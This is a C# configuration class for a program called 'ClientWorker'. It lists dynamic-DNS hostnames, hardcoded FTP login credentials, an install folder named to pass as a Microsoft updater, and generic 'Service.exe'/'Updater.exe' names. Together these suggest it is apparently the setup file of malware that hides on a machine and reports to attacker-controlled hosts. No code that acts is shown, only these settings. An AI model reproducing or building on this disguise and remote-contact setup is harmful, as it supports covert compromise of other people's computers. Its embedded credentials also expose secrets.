using System;
using System.Collections.Generic;

namespace ClientWorker
{
	public static class StartData
	{
		public static float version = 1f;
		public static string currentUser = "fokes1.asuscomm.com";
		public static string ftpUser = "ff";
		public static string ftpPass = "WorkerFF";
		public static int ftpPort = 21;
		public static string floaderNewCopy = "\\MicrosoftUpdater\\";
		public static string service = "Service.exe";
		public static string updater = "Updater.exe";
        public static string DescriptionProcess = "Service";
        public static string delimiter = "_";
        public static List<string> ddnsHostName = new List<string>
		{
			"fokes1.asuscomm.com",
			"us30.dlinkddns.com"
		};

		public static List<string> listFiles = new List<string>
		{
			"Service.exe"
		};
	}
}
